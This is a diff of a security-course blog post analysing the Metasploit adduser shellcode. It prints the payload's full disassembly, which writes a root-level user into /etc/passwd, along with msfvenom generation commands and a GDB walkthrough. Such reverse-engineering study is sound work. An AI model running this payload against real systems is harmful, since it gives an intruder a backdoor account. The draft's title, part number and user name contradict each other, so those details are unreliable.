@@ -1,6 +1,6 @@
 <!DOCTYPE HTML>
 <!--
-	Solution for SLAE question #5
+	Solution for SLAE question #5 part 3
 
 -->
 <html>
@@ -52,105 +52,312 @@
 									Post body goes here.
 									-->
                   <!--
-                  Solving slae question 5
+                  Solving slae question 5 part 3
                   -->
                   <section class="post">
                     <body>
                       <article id="first-post">
-												<a href="index.html"><img src="../images/chirs.png" class="avatar" alt="avatar"> </img></a>
-                        <h2>&emsp; Analyzing Msfvenom Payloads</h2>
-												<h5>&emsp; &emsp; &emsp; &emsp; October 30, 2020</h5>
+												<a href="index.html"><img src="../images/aaron.jpg" class="avatar" alt="avatar"> </img></a>
+                        <h2>&emsp; Analyzing Shell_Find_Tag Payload</h2>
+												<h5>&emsp; &emsp; &emsp; &emsp; November 2, 2020</h5>
                         <div class="box">
 
 													<br><h2>Contents</h2>
-													<a href="#POC" style="color:blue;">Drafting the Proof of Concept</a><br>
-													<a href="#Assembly" style="color:blue;">Writing the Assembly</a><br>
-													<a href="#Demonstration" style="color:blue;">Demonstration</a><br>
-													<a href="#Troubleshooting" style="color:blue;">Troubleshooting</a><br>
+													<a href="#Started" style="color:blue;">Getting Started</a><br>
+													<a href="#Disassembly" style="color:blue;">Dumping the Disassembly</a><br>
+													<a href="#Libemu" style="color:blue;">Libemu Analysis</a><br>
+													<a href="#GDB" style="color:blue;">GDB Analysis</a><br> <!-- Maybe not needed -->
 													<a href="#Thoughts" style="color:blue;">Thoughts and Lessons Learned</a><br><br>
 
-													<p>
-														&emsp; &emsp;Good evening Tim, this post involves analyzing at least three shellcode samples from msfvenom linux/x86 payloads. &nbsp;A bit of familiarity is
-														needed before continuing. &nbsp;The purpose of encoding is to obfuscate shellcode in order to maneuver a payload.
-														 &nbsp;A review of the reverse TCP shell is below:<br><br>
-														From the previous <a href="https://thestunneddefense.com/pages/shell-bind-tcp.html" target="_blank" style="color:blue;">article</a>: &nbsp;
-														Reverse shells are functionally similar to bind shells but work in the opposite direction. &nbsp;Instead, the attacker machine listens
-														for incoming connections from the vicitim machine over a preconfigured port (such as 4444). &nbsp;The connection attempt is initiated by the victim
-														machine by invoking a reverse shell. &nbsp;Below is what a reverse TCP shell looks like.
-											 	</p>
-												<center><div class="image post"><img src="../images/slae/assignment2/1-reverse-shell.png" alt="" /></div></center><br>
-												<br>
-
-
-			<br><section id="POC"><h2>Drafting the Proof of Concept</h2></section>
-
 											<p>
-												Similar to the bind shell, a Proof of Concept (PoC) is developed using the same methodology. &nbsp;Look for the unstaged
-												version of <i>Shell Reverse TCP</i> payload in <i>msfvenom</i> and break it apart with <i>libemu's sctest</i> tool.
+											&emsp; &emsp;Good evening Tim, this is the first of three posts about analyzing <i>msfvenom</i> shellcode samples. &nbsp;This sample is <i>adduser</i>. &nbsp;<i>Msfvenom</i> is a command
+											line tool by <a href="https://blog.rapid7.com/2011/05/24/introducing-msfvenom/" target="_blank" style="color:blue;"><i>Rapid7</i></a> that generates payloads
+											in various formats and encoding schemes. &nbsp;According to <i>Offensive Security</i>, it combined functionally of both <i>msfpayload</i> and <i>msfencode</i> as of
+											June 8, 2015 by placing both tools under a single framework.
 											</p>
 
-											<pre>
-												<code class="bash" style=display:block;white-space:pre-wrap>
--- snip --
 
 
-												</code>
-											</pre>
+			<br><section id="Started"><h2>Getting Started</h2></section>
 
+											<p>
+												&emsp; &emsp;Using any machine with Metasploit Framework, dump available payloads and verify <i>../adduser</i> exists. &nbsp;The specific command is
+												<code>msfvenom -l payloads | grep "linux/x86"</code>:
+											</p>
+											<center><div class="image post"><img src="../images/slae/assignment5/adduser/1-payloads-adduser.png" alt="" /></div></center><br>
 
-
-
-
-
-
-
-
-			<br><section id="Assembly"><h2>Writing the Assembly</h2></section>
-
-									<p>
-										&emsp; &emsp;Writing assembly
-									</p>
-									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
+											<p>
+												Next step is to determine what the payload requires. &nbsp;Dump the summary information with the command
+												<code>msfvenom -l linux/x86/adduser --list-options</code>. &nbsp;Note that the basic options take priority and in this case, advanced options are
+												taken care of. &nbsp;According to the summary, the <i>adduser</i>
+												payload creates a user, <i>metasploit</i>, with password, <i>metasploit</i>, and adds it to the admin group.
+											</p>
+											<center><div class="image post"><img src="../images/slae/assignment5/adduser/2-adduser-summary.png" alt="" /></div></center><br>
 
 
 
-
-
-			<br><section id="Demonstration"><h2>Demonstration</h2></section>
-								<!--
-								OBJDUMP Special Command:
-								objdump -d ./PROGRAM|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
-							-->
+			<br><section id="Disassembly"><h2>Dumping the Disassembly</h2></section>
 
 									<p>
-										&emsp; &emsp;Demonstrate shellcode here
+										&emsp; &emsp;Dump the disassembly with <i>ndisasm</i> using command <code>msfvenom -p linux/x86/adduser R | ndisasm -u -</code>. &nbsp;The <i>-p</i> option specifies the payload.
+										 &nbsp;<i>R</i> specifies raw output, which is then piped into <i>ndisasm</i>. &nbsp;
+										<a href="https://linux.die.net/man/1/ndisasm" target="_blank" style="color:blue;"><i>ndisasm</i></a> stands for "Netwide Disassembler" and is the companion disassembler for the
+										 <i>nasm</i> assembler used in the previous four blog posts. &nbsp;The <i>-u</i> option specifies 32-bit mode. &nbsp;Finally the single dash is a common UNIX option
+										 which allows <i>ndisasm</i> to
+										<a href="https://stackoverflow.com/questions/8045479/whats-the-magic-of-a-dash-in-command-line-parameters" target="_blank" style="color:blue;">allow input from <i>stdin</i></a>.
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
-
-
-
-
-
-			<br><section id="Debugging"><h2>Debugging</h2></section>
+									<pre>
+										<code class="x86asm" style=display:block;white-space:pre-wrap>
+00000000  31C9              xor ecx,ecx
+00000002  89CB              mov ebx,ecx
+00000004  6A46              push byte +0x46
+00000006  58                pop eax
+00000007  CD80              int 0x80
+00000009  6A05              push byte +0x5
+0000000B  58                pop eax
+0000000C  31C9              xor ecx,ecx
+0000000E  51                push ecx
+0000000F  6873737764        push dword 0x64777373
+00000014  682F2F7061        push dword 0x61702f2f
+00000019  682F657463        push dword 0x6374652f
+0000001E  89E3              mov ebx,esp
+00000020  41                inc ecx
+00000021  B504              mov ch,0x4
+00000023  CD80              int 0x80
+00000025  93                xchg eax,ebx
+00000026  E828000000        call 0x53
+0000002B  6D                insd
+0000002C  657461            gs jz 0x90
+0000002F  7370              jnc 0xa1
+00000031  6C                insb
+00000032  6F                outsd
+00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
+0000003B  736A              jnc 0xa7
+0000003D  3470              xor al,0x70
+0000003F  3449              xor al,0x49
+00000041  52                push edx
+00000042  633A              arpl [edx],di
+00000044  303A              xor [edx],bh
+00000046  303A              xor [edx],bh
+00000048  3A2F              cmp ch,[edi]
+0000004A  3A2F              cmp ch,[edi]
+0000004C  62696E            bound ebp,[ecx+0x6e]
+0000004F  2F                das
+00000050  7368              jnc 0xba
+00000052  0A598B            or bl,[ecx-0x75]
+00000055  51                push ecx
+00000056  FC                cld
+00000057  6A04              push byte +0x4
+00000059  58                pop eax
+0000005A  CD80              int 0x80
+0000005C  6A01              push byte +0x1
+0000005E  58                pop eax
+0000005F  CD80              int 0x80
+										</code>
+									</pre>
 
 									<p>
-										&emsp; &emsp;Debugging and Troubleshooting
+										The above dump is the entire assembly output, which includes multiple calls to <i>int 0x80</i>. &nbsp; Multiple DWORDs
+										with ascii characters are also pushed onto the stack. &nbsp;This information is useful; however, it is
+										difficult to parse on its own. &nbsp;Further analysis is needed starting with <i>Libemu</i>.
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
 
+
+
+			<br><section id="Libemu"><h2>Libemu Analysis</h2></section>
+
+								<p>
+									&emsp; &emsp;<i>Libemu</i> is a tricky tool to install so most of its analysis is done on the web VM. &nbsp;A successful install comes from this
+									<a href="https://github.com/buffer/libemu" target="_blank" style="color:blue;">repository</a> as it is the most recently supported version. &nbsp;Note
+									that in the repository's installation, tools are already included in the path so there is no need to search for binaries in <i>/tools/</i>. &nbsp;The only
+									<i>Libemu</i> tool missing from the VM is <i>dot</i>, which allows visual analysis via the creation of <i>png</i> files. &nbsp;Unfortunately <i>dot</i>
+									 cannot be used because the <i>sctest</i> output is incomplete. &nbsp;Navigate to the <i>../tools/sctest</i> folder to find the <i>sctest</i> binary.
+								</p>
+								<center><div class="image post"><img src="../images/slae/assignment5/adduser/3-sctest-folder.png" alt="" /></div></center><br>
+
+								<p>
+									After navigating to the folder, run the following command to pipe raw shellcode into <i>sctest</i>. &nbsp;For some reason the output stops at the
+									first syscall, thus a proper Control Flow Graph (CFG) file cannot be made using the <i>-G</i> option. &nbsp;Proper functionality was tested on a
+									<i>Libemu</i> install by running <code>sctest -vvv -Sc 100000 -G bind-shell.dot</code> on the <i>linux/x86/shell_bind_tcp</i> raw payload. &nbsp;A
+									png file depicting the payload's control flow was successfully created with the <i>dot</i> tool. &nbsp;The <i>adduser</i> payload provides no
+									further analysis vectors with <i>Libemu</i>.
+
+								</p>
+								<center><div class="image post"><img src="../images/slae/assignment5/adduser/4-sctest-out.png" alt="" /></div></center><br>
+
+
+
+			<br><section id="GDB"><h2>GDB Analysis</h2></section>
+
+									<p>
+										&emsp; &emsp;In order to analyze the shellcode in <i>GDB</i>, it will need to be extracted and placed into a C-code harness.
+										 &nbsp;Use the below command to create a payload in C-code format. &nbsp;To list additional formats, simply run
+										 <code>msfvenom --list formats</code>.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/adduser/5-create-shellcode-again.png" alt="" /></div></center><br>
+
+									<p>
+										Copy and paste shellcode into the C-code harness.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/adduser/6-paste-harness-again.png" alt="" /></div></center><br>
+
+									<p>
+										Save the file and compile it with <code>gcc -fno-stack-protector -z execstack shellcode.c -o shellcode</code>. &nbsp;Start
+										<i>GDB</i> in quiet mode and disassemble the <i>main()</i> function. &nbsp;Stop at instruction <code>call eax</code>. &nbsp;This
+										is where the shellcode is passed control.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/adduser/7-gdb-main-again.png" alt="" /></div></center><br>
+
+									<p>
+										Step one more instruction then disassemble the payload. &nbsp;This should look identical to the <i>nasm</i> disassembly.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/adduser/8-assembly-dump.png" alt="" /></div></center><br>
+
+									<p>
+										The above assembly includes 4 calls to <i>int 0x80</i> and multiple ascii bytes pushed onto the stack. &nbsp;By noting the values of <i>eax</i>,
+										each syscall can be mapped in order using the <a href="http://shell-storm.org/shellcode/files/syscalls.html" target="_blank" style="color:blue;">syscall table</a>:
+										<a href="https://man7.org/linux/man-pages/man2/setreuid.2.html" target="_blank" style="color:blue;"><i>setreuid()</i></a>,
+										<a href="https://man7.org/linux/man-pages/man2/open.2.html" target="_blank" style="color:blue;"><i>open()</i></a>,
+										<a href="https://man7.org/linux/man-pages/man2/write.2.html" target="_blank" style="color:blue;"><i>write()</i></a>, and
+										<a href="https://man7.org/linux/man-pages/man2/exit.2.html" target="_blank" style="color:blue;"><i>exit()</i></a>.
+
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/adduser/9-syscall-number.png" alt="" /></div></center><br>
+
+									<p>
+										Starting with <i>setreuid()</i>, 0x46 (70) is loaded into <i>eax</i> while <i>ebx</i> and <i>ecx</i> are set to zero.
+										 &nbsp;Both parameters are zero because the shellcode sets the UID to zero according to the earlier description. &nbsp;Step
+										 through the first few instructions and reach the syscall to confirm the parameters. &nbsp;The corresponding
+										 hook-stop is defined below:
+									</p>
+									<pre>
+										<code style=display:block;white-space:pre-wrap>
+(gdb) define hook-stop
+Type commands for definition of "hook-stop".
+End with a line saying just "end".
+>print/x $eax
+>print/x $ebx
+>print/x $ecx
+>print/x $edx
+>disassemble $eip,+28
+>x/24xb $esp
+>end
+(gdb)
+										</code>
+									</pre>
+									<center><div class="image post"><img src="../images/slae/assignment5/adduser/10-before-setreuid.png" alt="" /></div></center><br>
+
+									<p>
+										Step again to observe results from the call to <i>setreuid()</i>. &nbsp;Register <i>eax</i> is zero meaning the call was successful. &nbsp;Furthermore,
+										nothing was changed on the stack.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/adduser/11-after-setreuid.png" alt="" /></div></center><br>
+
+									<p>
+										The next syscall is to <i>open()</i> shown by loading 0x5 into <i>eax</i>. &nbsp;It takes two parameters: pathname to the requested file as a pointer,
+										and flags. &nbsp;Revisit the DWORDs pushed onto the stack and convert the bytes to ascii. &nbsp;It spells <i>/etc/passwd</i>! &nbsp;The values
+										 placed into ecx are 0x0401, which represent file permissions similar to what is observed in <i>chmod</i>. &nbsp;The flag
+										 represents both <b>O_WRONLY</b> (write only) and <b>O_NOCTTY</b> (do not assign controlling terminal). &nbsp;Their exact
+										 values can be found in <i>/usr/include/asm-generic/fcntl.h</i>. &nbsp;If successful, the return value is a file descriptor
+										  used in later syscalls.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/adduser/12-before-open.png" alt="" /></div></center><br>
+
+									<p>
+										Step through the <i>open()</i> syscall to receive a file descriptor value of 8. &nbsp;
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/adduser/13-after-open.png" alt="" /></div></center><br>
+
+									<p>
+										The next branch uses a strange <i>call</i> instruction that points to the middle of a later instruction below. &nbsp;Specifically it points to the middle of
+										instruction <code>or bl, BYTE PTR [ecx-0x75]</code>. &nbsp;This seems out of place. &nbsp;Why would a program do this? &nbsp;Remember that the <i>call</i>
+										 instruction places the address of the next instruction (0x5655704b) onto the stack.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/adduser/14-before-call.png" alt="" /></div></center><br>
+
+									<p>
+										After the <i>call</i> instruction, a <code>pop ecx</code> instruction appears! &nbsp;This activity appears very similar to that found in JMP-CALL-POP,
+										which means garbage instructions starting at address 0x5655704b represent a "sub-payload" inside the <i>adduser</i> payload! &nbsp;It is likely a parameter to
+										a later system call.<br>
+										 &emsp; &emsp;The subsequent instruction
+										changes to <code>mov edx, DWORD PTR [ecx-0x4]</code> and 0x5655704b appears on the stack. &nbsp;Based on the call, it appears
+										changes occured because execution control was passed to the middle of an instruction; reshuffling opcode bytes in the process.
+										  <!-- Compare opcode bytes of pop ecx with what was dumped
+											in ndisasm.  pop ecx opcode should match with opcode in the middle of instruction at 0x5655706b.
+											The instruction at 0x5655706b is 'or bl, BYTE PTR [ecx-0x75]'
+
+											opcode table: http://sparksandflames.com/files/x86InstructionChart.html
+										-->
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/adduser/15-after-call.png" alt="" /></div></center><br>
+
+									<p>
+										Verify the opcode bytes of <code>mov edx, DWORD PTR [ecx-0x4]</code> by dumping it into shell-storm's online
+										<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/" target="_blank" style="color:blue;">assembler/disassembler tool</a>.
+										 &nbsp;
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/adduser/16-assemble-instructions.png" alt="" /></div></center><br>
+
+									<p>
+										The output matches the next 3 opcode bytes from the <i>ndisasm</i> disassembly. &nbsp;Below is the snipped output (before executing
+										<code>call 0x53</code>) to show relevant sections of the payload. &nbsp;Byte 0x59 is indeed followed by opcode bytes 0x8b, 0x51, and 0xfc.
+									</p>
+									<pre>
+										<code class="x86asm" style=display:block;white-space:pre-wrap>
+
+00000026  E828000000        call 0x53           ; next instruction's address loaded onto the stack (0x5655704b)
+0000002B  6D                insd
+
+; snip garbage instructions / payload
+
+00000050  7368              jnc 0xba
+; byte 0x59 is called so the below instructions change to "pop ecx; mov edx, DWORD PTR [ecx-0x4]"
+00000052  0A 59 8B          or bl,[ecx-0x75]
+00000055  51                push ecx
+00000056  FC                cld
+
+; continue valid instructions below
+
+00000057  6A04              push byte +0x4
+00000059  58                pop eax
+0000005A  CD80              int 0x80
+0000005C  6A01              push byte +0x1
+0000005E  58                pop eax
+0000005F  CD80              int 0x80
+										</code>
+									</pre>
+
+									<p>
+										Step through <code>mov edx, DWORD PTR [ecx-0x4]</code> to load 0x21 into <i>edx</i>. &nbsp;According to the <i>write()</i> man page, <i>edx</i> holds the
+										number of bytes to write; 33 in this case. &nbsp;Register <i>ecx</i> contains the address holding the contents to write; in this case, it's the starting point of the
+										33 bytes to write. &nbsp;The file descriptor is loaded into <i>ebx</i> and the system call number, 0x4, is loaded into <i>eax</i>.
+
+										<!-- &nbsp;Parameters before <i>write()</i> instruction. &nbsp;-->
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/adduser/17-before-write.png" alt="" /></div></center><br>
+
+									<p>
+										A successful execution of <i>write()</i> returns the number of bytes written. &nbsp;33 bytes were successfully written according to the <i>eax</i> value. &nbsp;All
+										bytes of the sub-payload were written because 0x5655704b + 0x21 = 0x5655706c, which is the start of instruction <code>pop ecx</code>!
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/adduser/18-after-write.png" alt="" /></div></center><br>
+
+									<p>
+										The contents written to <i>/etc/passwd</i> can be checked by dumping 33 bytes. &nbsp;Below shows the string of user <i>bob</i>, their password,
+										User ID (UID), Group ID (GID), home directory, and starting program (typically an interactive shell).
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/adduser/19-dump-subpayload.png" alt="" /></div></center><br>
 
 
 
 		<br><section id="Thoughts"><h2>Thoughts and Lessons Learned</h2></section>
 
 									<p>
-										&emsp; &emsp;Conclusion goes here
+										&emsp; &emsp;Analyzing payloads from <i>msfvenom</i> is great way to familiarize with other types of shellcode. &nbsp;Not all exploits
+										involve reverse shells! &nbsp;It is also important to understand not every tool will yield fruitful analysis. &nbsp;<i>Libemu</i>
+										provided little help with this analysis but is much friendlier towards shell-type payloads. &nbsp;The next <i>msfvenom</i> analysis
+										involves <i>read_file</i>.
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
-
-
-
-
 
 									<p>
 										The source code for this assignment as well as other SLAE assignments is here:
@@ -164,19 +371,11 @@
 									Student ID: PA-15981
 									</p>
 
-
                         </div>
 
                       </article>
                     </body>
                   </section>
-
-
-
-
-
-
-
 
 									<!--
 									End post body
@@ -185,11 +384,6 @@
 									<!--
 									NEW POSTS GO ABOVE THIS LINE
 									-->
-
-
-
-
-
 
 									<!-- Remove Pagination
 							<div class="pagination"><a href="#"> 1 </a></div>
